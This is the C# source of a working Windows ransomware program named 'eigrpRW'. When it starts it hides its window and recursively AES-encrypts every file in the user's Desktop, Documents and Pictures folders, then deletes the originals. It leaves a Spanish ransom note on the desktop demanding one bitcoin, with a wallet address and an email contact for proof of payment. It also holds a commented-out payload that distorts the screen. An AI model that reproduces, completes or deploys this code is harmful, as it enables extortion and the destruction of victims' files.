using System;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace eigrpRW
{
    public partial class Form1 : Form
    {
        private const bool DELETE_ALL_ORIGINALS = true;
        private const bool ENCRYPT_DESKTOP = true;
        private const bool ENCRYPT_DOCUMENTS = true;
        private const bool ENCRYPT_PICTURES = true;
        private const string ENCRYPTED_FILE_EXTENSION = ".eigrp";
        private const string ENCRYPT_PASSWORD = "eigrp24@";
        private const string BITCOIN_ADDRESS = "1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1";
        private const string BITCOIN_RANSOM_AMOUNT = "1";
        private const string EMAIL_ADDRESS = "nosoyvargas@yopmail.com";

        private static string ENCRYPTION_LOG = "";
        private string RANSOM_LETTER =
           "Todos tus archivos han sido encriptados por el gato EIGRP.\n\n" +
           "Para desbloquearlos envia " + BITCOIN_RANSOM_AMOUNT + " bitcoin(s) tasa BCV a la siguiente cartera BTC " + BITCOIN_ADDRESS + "\n" +
           "Despues, envia la prueba a " + EMAIL_ADDRESS + "\n\n" +
           "Buen dia, doctorisimo Luis.\n\n" +
           "Log de archivos encriptados:\n" +
           "----------------------------------------\n";

        private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private static int encryptedFileCount = 0;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            initializeForm();

            // Encripta los archivos de las carpetas seleccionadas
            if (ENCRYPT_DESKTOP)
            {
                encryptFolderContents(DESKTOP_FOLDER);
            }

            if (ENCRYPT_PICTURES)
            {
                encryptFolderContents(PICTURES_FOLDER);
            }

            if (ENCRYPT_DOCUMENTS)
            {
                encryptFolderContents(DOCUMENTS_FOLDER);
            }

            // Si se encriptaron archivos, formatea el formulario y deja la carta de rescate
            if (encryptedFileCount > 0)
            {
                formatFormPostEncryption();
                dropRansomLetter();
            }
            else
            {
                Console.Out.WriteLine("No hay archivos que encriptar...");
                Application.Exit();
            }
        }

        // Crea y guarda la carta de rescate
        private void dropRansomLetter()
        {
            StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\Recupera los archivos" + ENCRYPTED_FILE_EXTENSION + ".txt");
            ransomWriter.WriteLine(RANSOM_LETTER);
            ransomWriter.WriteLine(ENCRYPTION_LOG);
            ransomWriter.Close();
        }

        // Ajusta el formulario tras la encriptación
        private void formatFormPostEncryption()
        {
            this.Opacity = 100;
            this.WindowState = FormWindowState.Maximized;
            lblCount.Text = "Tus archivos (n: " + encryptedFileCount + ") han sido encriptados!";
        }

        // Inicializa el formulario antes de la encriptación
        private void initializeForm()
        {
            this.Opacity = 0;
            this.ShowInTaskbar = false;
            lblBitcoinAmount.Text = "Por favor envia " + BITCOIN_RANSOM_AMOUNT + " Bitcoin(s) a la siguiente cartera";
            txtBitcoinAddress.Text = BITCOIN_ADDRESS;
            txtEmailAddress.Text = EMAIL_ADDRESS;
            lblBitcoinAmount.Focus();
        }

        // Encripta todos los archivos de una carpeta
        static void encryptFolderContents(string sDir)
        {
            try
            {
                // Procesa archivos en el directorio
                foreach (string f in Directory.GetFiles(sDir))
                {
                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
                    {
                        Console.Out.WriteLine("Encriptando: " + f);
                        FileEncrypt(f, ENCRYPT_PASSWORD);
                    }
                }

                // Procesa subdirectorios de forma recursiva
                foreach (string d in Directory.GetDirectories(sDir))
                {
                    encryptFolderContents(d);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        // Encripta un archivo utilizando AES
        private static void FileEncrypt(string inputFile, string password)
        {
            // Genera una sal aleatoria
            byte[] salt = GenerateRandomSalt();

            // Crea el archivo de salida con la extensión definida
            FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);

            // Convierte la contraseña a un arreglo de bytes
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            // Configura el algoritmo de encriptación AES
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            // Deriva la clave y el vector de inicialización (IV) usando la contraseña y la sal
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CBC;

            // Escribe la sal al inicio del archivo de salida
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            // Crea un buffer para leer y escribir el archivo en partes
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }

                // Cierra el archivo de entrada
                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                // Actualiza el log y elimina el archivo original si está configurado
                ENCRYPTION_LOG += inputFile + "\n";
                encryptedFileCount++;
                cs.Close();
                fsCrypt.Close();
                if (DELETE_ALL_ORIGINALS)
                {
                    File.Delete(inputFile);
                }
            }
        }

        // Genera una sal aleatoria para encriptación
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }

            return data;
        }

        //public class gdi
        //{
        //    public void gdi_payload()
        //    {
        //        int count = 1000;
        //        while (true)
        //        {
        //            Random rand;
        //            rand = new Random();
        //            int x = Screen.PrimaryScreen.Bounds.Width; int y = Screen.PrimaryScreen.Bounds.Height;
        //            IntPtr hdc = dport.GetDC(IntPtr.Zero);
        //            dport.StretchBlt(hdc, (rand.Next(2) == 1) ? -1 : 1, (rand.Next(2) == 1) ? -1 : 1, x, y, hdc, 0, 0,
        //            x, y, dport.TernaryRasterOperations.SRCAND);
        //            dport.DeleteDC(hdc);
        //            if (count != 10)
        //                Thread.Sleep(count -= 10);
        //            else
        //                Thread.Sleep(1);
        //        }
        //    }
        //}
        private void lblCount_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }
    }
}
